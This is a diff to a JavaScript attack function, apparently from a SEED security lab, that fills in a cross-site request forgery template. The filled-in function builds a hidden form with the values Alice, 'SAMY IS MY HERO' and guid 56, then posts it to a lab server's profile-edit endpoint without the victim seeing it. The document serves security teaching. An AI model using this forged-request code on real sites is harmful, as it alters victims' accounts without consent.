@@ -9,16 +9,16 @@ function forge_post()
 
     // The following are form entries need to be filled out by attackers.
     // The entries are made hidden, so the victim won't be able to see them.
-    fields += "<input type='hidden' name='name' value='****'>";
-    fields += "<input type='hidden' name='briefdescription' value='****'>";
+    fields += "<input type='hidden' name='name' value='Alice'>";
+    fields += "<input type='hidden' name='briefdescription' value='SAMY IS MY HERO'>";
     fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
-    fields += "<input type='hidden' name='guid' value='****'>";
+    fields += "<input type='hidden' name='guid' value='56'>";
 
     // Create a <form> element.
     var p = document.createElement("form");
 
     // Construct the form
-    p.action = "http://www.example.com";
+    p.action = "http://www.seed-server.com/action/profile/edit";
     p.innerHTML = fields;
     p.method = "post";
 
